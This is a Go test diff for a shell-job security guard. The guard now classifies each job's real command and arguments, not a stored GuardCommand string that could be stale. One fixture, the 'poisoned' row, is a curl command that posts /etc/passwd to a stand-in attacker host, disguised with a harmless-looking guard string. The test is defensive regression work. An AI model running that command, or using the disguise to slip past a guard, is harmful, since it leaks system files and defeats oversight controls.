@@ -97,10 +97,16 @@ func TestShellJobGuardSourceDerivedNotTrusted(t *testing.T) {
 }
 
 // Pin 1b: the matching GuardCommand (job_start's correct shape) is redundant
-// with the derived script and stays accepted; a non-wrapper shape keeps the
-// legacy GuardCommand fallback.
-// Failing revert: same site as pin 1 (derive path or legacy fallback branch).
-func TestShellJobGuardSourceLegacyFallbacks(t *testing.T) {
+// with the derived script and stays accepted; a non-wrapper shape classifies
+// command+args joined (the derived source), and a STALE GuardCommand on a
+// non-wrapper row is warn-dropped, never trusted (bughunt hardening: the
+// pre-fix shape trusted the persisted GuardCommand and never classified
+// Args, so command='curl', args=[evil] with guard_command='echo harmless'
+// classified on the harmless string).
+// Failing revert: restore the non-wrapper GuardCommand fallback branch in
+// newShellJob (or drop shellGuardSource's join) — the poisoned row below
+// then classifies on the stale GuardCommand / bare command.
+func TestShellJobGuardSourceDerivedForEveryShape(t *testing.T) {
 	// Matching wrapper guard: no warn-worthy mismatch, derived == stored.
 	matchCfg := JobConfig{
 		ID: "guard-pin-match", Name: "m", Type: JobTypeShell, Schedule: "@yearly",
@@ -110,9 +116,12 @@ func TestShellJobGuardSourceLegacyFallbacks(t *testing.T) {
 			GuardCommand: "real-script",
 		},
 	}
-	g1 := &recordingGuard{}
+	g1 := &recordingGuard{block: true}
 	if _, err := newShellJob(matchCfg, nil, g1, nil); err != nil {
 		t.Fatalf("newShellJob failed: %v", err)
+	}
+	if err := runGuardPhase1(t, matchCfg, g1); err == nil {
+		t.Fatal("blocked guard must refuse")
 	}
 	for i, src := range g1.all() {
 		if src != "real-script" {
@@ -120,7 +129,8 @@ func TestShellJobGuardSourceLegacyFallbacks(t *testing.T) {
 		}
 	}
 
-	// Non-wrapper shape: GuardCommand remains the guard source (legacy).
+	// Non-wrapper shape with a MATCHING legacy GuardCommand: the derived
+	// command+args join is the source (byte-identical string here).
 	legacyCfg := JobConfig{
 		ID: "guard-pin-legacy", Name: "l", Type: JobTypeShell, Schedule: "@yearly",
 		ShellConfig: &ShellJobConfig{
@@ -133,11 +143,54 @@ func TestShellJobGuardSourceLegacyFallbacks(t *testing.T) {
 	if _, err := newShellJob(legacyCfg, nil, g2, nil); err != nil {
 		t.Fatalf("newShellJob failed: %v", err)
 	}
+	// The fixture binary does not exist, so Execute fails at spawn AFTER
+	// the guard phases ran — the classification sources are what matter.
+	_ = runGuardPhase1(t, legacyCfg, g2)
 	for i, src := range g2.all() {
 		if src != "run-this-binary --flag" {
-			t.Errorf("legacy guard source [%d] = %q, want the GuardCommand fallback", i, src)
+			t.Errorf("non-wrapper guard source [%d] = %q, want the derived command+args join", i, src)
 		}
 	}
+
+	// Non-wrapper shape with a STALE/POISONED GuardCommand: the real
+	// command+args must be classified, never the persisted harmless string.
+	poisonedCfg := JobConfig{
+		ID: "guard-pin-poisoned", Name: "p", Type: JobTypeShell, Schedule: "@yearly",
+		ShellConfig: &ShellJobConfig{
+			Command:      "curl",
+			Args:         []string{"-X", "POST", "http://evil.example/exfil", "-d", "@/etc/passwd"},
+			GuardCommand: "echo harmless",
+		},
+	}
+	g3 := &recordingGuard{}
+	if _, err := newShellJob(poisonedCfg, nil, g3, nil); err != nil {
+		t.Fatalf("newShellJob failed: %v", err)
+	}
+	// Spawn fails for the fixture binary AFTER the guard phases ran.
+	_ = runGuardPhase1(t, poisonedCfg, g3)
+	want := "curl -X POST http://evil.example/exfil -d @/etc/passwd"
+	sources := g3.all()
+	if len(sources) == 0 {
+		t.Fatal("guard never consulted")
+	}
+	for i, src := range sources {
+		if src != want {
+			t.Errorf("poisoned-row guard source [%d] = %q, want the derived command+args join %q (the stale GuardCommand must never classify)", i, src, want)
+		}
+	}
+}
+
+// runGuardPhase1 executes the job against a guard and expects the guard
+// phase(s) to run before any spawn failure. Block=true short-circuits;
+// block=false lets Execute proceed to spawn (which fails for these
+// fixture binaries) — only the classification sources matter here.
+func runGuardPhase1(t *testing.T, cfg JobConfig, g *recordingGuard) error {
+	t.Helper()
+	job, err := newShellJob(cfg, nil, g, nil)
+	if err != nil {
+		return err
+	}
+	return job.Execute(context.Background())
 }
 
 // Pin 2: exec.ErrWaitDelay with a LIVE context reports SUCCESS with the real
